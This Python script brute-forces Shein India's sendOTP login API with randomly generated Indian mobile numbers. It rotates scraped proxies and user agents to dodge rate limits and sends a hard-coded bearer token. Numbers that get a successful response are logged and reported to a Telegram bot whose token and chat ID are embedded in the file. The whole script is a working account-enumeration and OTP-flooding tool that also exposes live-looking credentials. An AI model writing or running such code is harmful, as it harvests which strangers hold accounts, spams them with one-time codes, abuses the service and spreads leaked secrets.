import requests
import random
import time
import signal
import urllib3
import threading
import os
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GREEN, YELLOW, RED, CYAN, RESET = "\033[92m", "\033[93m", "\033[91m", "\033[96m", "\033[0m"

MAX_THREADS      = 2
VALIDATION_THREADS = 3
SLEEP_PER_REQ    = 0.6
REQUEST_TIMEOUT  = 10
OUTPUT_FILE      = "number.txt"
RESUME_FILE      = "checked.txt"

BOT_TOKEN        = "8556849041:AAHtdyw5UgiblYb9Ca1uXcYiM93-IVA9Ow8"       
USER_ID          = "6142471155"  

URL = "https://api.services.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
PROXY_API = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=IN&ssl=all&anonymity=all"

USER_AGENTS = [
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G960F Build/RP1A.200720.012)",
    "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro Build/QKQ1.190825.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; KB2003 Build/RP1A.201005.001)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-S908B Build/TP1A.220624.014)",
    "Dalvik/2.1.0 (Linux; U; Android 9; LYA-L29 Build/HUAWEILYA-L29)"
]

total_requests = 0
successful_saves = 0
checked_numbers = set()
checked_lock = threading.Lock()

def load_session():
    if os.path.exists(RESUME_FILE):
        with open(RESUME_FILE, "r") as f:
            for line in f:
                num = line.strip()
                if num:
                    checked_numbers.add(num)
        print(f"{CYAN}[SYSTEM] Session Resumed: {len(checked_numbers)} numbers loaded from history.{RESET}")
    else:
        open(RESUME_FILE, "w").close()

def save_checked_number(number):
    with checked_lock:
        with open(RESUME_FILE, "a") as f:
            f.write(f"{number}\n")

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()
        self.refresh_proxies()
        threading.Thread(target=self._refresh_loop, daemon=True).start()

    def check_proxy(self, proxy_addr):
        px = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"}
        try:
            requests.options(URL, proxies=px, timeout=3, verify=False)
            return proxy_addr
        except:
            return None

    def refresh_proxies(self):
        try:
            print(f"{YELLOW}[SYSTEM] Updating Indian Proxy Pool...{RESET}")
            response = requests.get(PROXY_API, timeout=10)
            if response.status_code == 200:
                raw_list = response.text.strip().split('\r\n')
                candidates = [p for p in raw_list if ":" in p][:50]
                with ThreadPoolExecutor(max_workers=VALIDATION_THREADS) as v_exec:
                    results = v_exec.map(self.check_proxy, candidates)
                    valid_ones = [r for r in results if r is not None]
                with self.lock:
                    self.proxies = valid_ones
                print(f"{GREEN}[SYSTEM] Pool Updated: {len(self.proxies)} IPs verified.{RESET}")
        except Exception as e:
            print(f"{RED}[ERROR] Refresh failed: {e}{RESET}")

    def _refresh_loop(self):
        while True:
            time.sleep(60)
            self.refresh_proxies()

    def get_proxy(self):
        with self.lock:
            return random.choice(self.proxies) if self.proxies else None

def handle_hit(number, success_total):
    try:
        with open(OUTPUT_FILE, "a") as f:
            f.write(f"{number}\n")
    except Exception as e:
        print(f"{RED}[FILE ERROR] {e}{RESET}")

    try:
        msg = f"âœ… HIT FOUND!\nðŸ“± Number: {number}\nðŸ“Š Total Hits: {success_total}"
        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(tg_url, data={"chat_id": USER_ID, "text": msg}, timeout=5)
    except:
        pass

proxy_mgr = ProxyManager()

def get_unique_number():
    global checked_numbers
    while True:
        num = str(random.randint(6000000000, 9999999999))
        with checked_lock:
            if num not in checked_numbers:
                checked_numbers.add(num)
                break
    save_checked_number(num)
    return num

signal.signal(signal.SIGINT, signal.SIG_IGN)

def request_worker(thread_id):
    global total_requests, successful_saves
    
    current_proxy = proxy_mgr.get_proxy()
    current_ua = random.choice(USER_AGENTS)
    check_count = 0
    rotate_at = random.randint(5, 15)

    while True:
        if check_count >= rotate_at:
            current_proxy = proxy_mgr.get_proxy()
            current_ua = random.choice(USER_AGENTS)
            rotate_at, check_count = random.randint(5, 15), 0
            print(f"{YELLOW}[Thread-{thread_id}] Rotated to: {current_proxy}{RESET}")

        number = get_unique_number()
        total_requests += 1
        check_count += 1
        
        headers = {
            "Host": "api.services.sheinindia.in",
            "authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
            "x-tenant": "B2C",
            "x-tenant-id": "SHEIN",
            "client_type": "Android/35",
            "User-Agent": current_ua,
            "Content-Type": "application/x-www-form-urlencoded"
        }

        for attempt in range(2):
            px_cfg = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"} if current_proxy else None
            try:
                resp = requests.post(URL, data={"mobileNumber": number}, headers=headers, proxies=px_cfg, timeout=REQUEST_TIMEOUT, verify=False)
                print(f"[{CYAN}{total_requests}{RESET}] {number} | Status: {resp.status_code}")

                if resp.status_code == 200 and resp.json().get('success'):
                    successful_saves += 1
                    handle_hit(number, successful_saves)
                break 
            
            except Exception:
                current_proxy = proxy_mgr.get_proxy()
                check_count = 0
                if attempt == 1: print(f"{RED}[Thread-{thread_id}] Skip failed number {number}{RESET}")

        time.sleep(SLEEP_PER_REQ)

load_session()
print(f"{GREEN}Engine Started | Session Resume Enabled | Range: 6B - 10B{RESET}")

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    executor.map(request_worker, range(MAX_THREADS))
